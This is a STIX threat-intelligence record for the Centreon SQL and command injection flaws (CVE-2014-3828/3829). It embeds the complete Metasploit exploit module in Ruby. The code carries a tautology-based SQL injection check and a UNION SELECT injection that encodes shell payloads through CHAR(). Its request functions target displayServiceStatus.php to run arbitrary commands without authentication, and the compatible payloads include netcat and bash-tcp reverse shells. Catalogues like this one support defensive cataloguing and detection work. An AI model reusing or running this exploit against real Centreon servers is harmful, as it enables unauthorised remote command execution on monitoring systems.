{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--81d1157f-85e2-4472-a48d-a47e3ec3a1fa",
    "created": "2024-08-14T17:01:49.774746Z",
    "modified": "2024-08-14T17:01:49.774751Z",
    "name": "Centreon SQL and Command Injection",
    "description": " This module exploits several vulnerabilities on Centreon 2.5.1 and prior and Centreon Enterprise Server 2.2 and prior. Due to a combination of SQL injection and command injection in the displayServiceStatus.php component, it is possible to execute arbitrary commands as long as there is a valid session registered in the centreon.session table. In order to have a valid session, all it takes is a successful login from anybody. The exploit itself does not require any authentication.  This module has been tested successfully on Centreon Enterprise Server 2.2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/centreon_sqli_exec.rb",
            "external_id": "centreon_sqli_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3828"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3829"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Oct/78"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Centreon SQL and Command Injection',\n      'Description'    => %q{\n        This module exploits several vulnerabilities on Centreon 2.5.1 and prior and Centreon\n        Enterprise Server 2.2 and prior. Due to a combination of SQL injection and command\n        injection in the displayServiceStatus.php component, it is possible to execute arbitrary\n        commands as long as there is a valid session registered in the centreon.session table.\n        In order to have a valid session, all it takes is a successful login from anybody.\n        The exploit itself does not require any authentication.\n\n        This module has been tested successfully on Centreon Enterprise Server 2.2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'MaZ', # Vulnerability Discovery and Analysis\n          'juan vazquez' # Metasploit Module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-3828'],\n          ['CVE', '2014-3829'],\n          ['US-CERT-VU', '298796'],\n          ['URL', 'https://seclists.org/fulldisclosure/2014/Oct/78']\n        ],\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Payload'        =>\n        {\n          'Space'       => 1500, # having into account 8192 as max URI length\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic python gawk bash-tcp netcat ruby openssl'\n            }\n        },\n      'Targets'        =>\n        [\n          ['Centreon Enterprise Server 2.2', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-10-15',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/centreon'])\n      ])\n  end\n\n  def check\n    random_id = rand_text_numeric(5 + rand(8))\n    res = send_session_id(random_id)\n\n    unless res && res.code == 200 && res.headers['Content-Type'] && res.headers['Content-Type'] == 'image/gif'\n      return Exploit::CheckCode::Safe\n    end\n\n    injection = \"#{random_id}' or 'a'='a\"\n    res = send_session_id(injection)\n\n    if res && res.code == 200\n      if res.body && res.body.to_s =~ /sh: graph: command not found/\n        return Exploit::CheckCode::Vulnerable\n      elsif res.headers['Content-Type'] && res.headers['Content-Type'] == 'image/gif'\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, \"#{peer} - The SQLi cannot be exploited\")\n    elsif check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - The SQLi cannot be exploited. Possibly because there's nothing in the centreon.session table. Perhaps try again later?\")\n    end\n\n    print_status(\"Exploiting...\")\n    random_id = rand_text_numeric(5 + rand(8))\n    random_char = rand_text_alphanumeric(1)\n    session_injection = \"#{random_id}' or '#{random_char}'='#{random_char}\"\n    template_injection = \"' UNION ALL SELECT 1,2,3,4,5,CHAR(59,#{mysql_payload}59),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- /**\"\n    res = send_template_id(session_injection, template_injection)\n\n    if res && res.body && res.body.to_s =~ /sh: --imgformat: command not found/\n      vprint_status(\"Output: #{res.body}\")\n    end\n  end\n\n  def send_session_id(session_id)\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.to_s, 'include', 'views', 'graphs', 'graphStatus', 'displayServiceStatus.php'),\n      'vars_get' =>\n        {\n          'session_id' => session_id\n        }\n    )\n\n    res\n  end\n\n  def send_template_id(session_id, template_id)\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.to_s, 'include', 'views', 'graphs', 'graphStatus', 'displayServiceStatus.php'),\n      'vars_get' =>\n        {\n          'session_id' => session_id,\n          'template_id' => template_id\n        }\n      }, 3)\n\n    res\n  end\n\n  def mysql_payload\n    p = ''\n    payload.encoded.each_byte { |c| p << \"#{c},\"}\n    p\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-15",
    "x_mitre_platforms": [
        "unix'"
    ]
}